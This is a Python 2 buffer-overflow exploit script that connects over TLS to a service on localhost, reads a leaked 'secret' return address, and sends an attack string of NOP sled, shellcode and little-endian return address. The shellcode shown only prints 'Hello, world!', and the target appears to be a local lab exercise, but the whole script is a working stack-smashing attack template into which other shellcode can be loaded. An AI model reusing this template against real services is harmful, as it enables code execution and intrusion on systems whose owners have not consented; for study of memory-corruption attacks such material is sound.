#!/usr/bin/env python
import time
import socket
import binascii
import ssl

DO_SLEEPS = False


target_buf_len = 128
target_buf_room = target_buf_len - 5  # for the retaddr and null terminator

shell = None
if True:
#if False:
    print "Using hw_shell"
    shell = bytearray (b'\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0f\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a\x0d')
else:
    print "Using xor_shell"
    shell_file = "../ByteArrays.old/hw-call4dword.rawshell"
    #print "Using sganai_shell"
    #shell_file = "../ByteArrays.old/hw-sganai.rawshell"
    fh = open (shell_file, 'rb')
    shell = bytearray (fh.read())
    fh.close ()

if shell == None:
    print "Error, no shell given"
    sys.exit(2)

print "Imported %uB long shell" % len (shell)
if len (shell) > target_buf_room :
    print "Error: shell too big"
    exit
    
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = ssl.wrap_socket(sock, cert_reqs = ssl.CERT_NONE, ssl_version = ssl.PROTOCOL_TLSv1)

# dry run version, no socket comm
def getSecret_nosock (s):
    data = "cafebabe\n"
    print "Recv'd: " + data
    return data[-9:-1]

def getSecret (s):
    TCP_IP = '127.0.0.1'
    TCP_PORT = 10000
    BUFFER_SIZE = 1024
    INIT_MESSAGE = "Are you there?\n"
    connected = False 
    while not connected:
        try:
            print "Connecting"
            s.connect((TCP_IP, TCP_PORT))
            connected = True
        except:
            connected = False 
            time.sleep(1)
        
    print "Connected"
    if DO_SLEEPS: time.sleep(5)
    print "Sending"
    s.send (INIT_MESSAGE)
    print "Sent: " + INIT_MESSAGE
    data = s.recv (BUFFER_SIZE)
    if len (data) == 0:
        print "Error, no data recv'd"
        exit
    print "Recv'd: " + data
    return data[-9:-1]


    
# test retaddr for nulls
retaddr = binascii.a2b_hex(getSecret (ssl_sock) )
retaddr_le = ''.join(reversed (retaddr) )
print "Secret in little endian: " + retaddr_le.encode('hex')

nops = bytearray (b'\x90' * (target_buf_room - len (shell) ))
attack_string = bytearray (nops + shell + bytearray (retaddr_le) + bytearray (b'\x00') )

print "Attack string, " + str (len (attack_string) ) + "B: " + ''.join(format(x, '02x') for x in attack_string)
if DO_SLEEPS: time.sleep(5)
ssl_sock.send (str (attack_string) )
print "Sent"

ssl_sock.shutdown(socket.SHUT_RDWR)
ssl_sock.close()
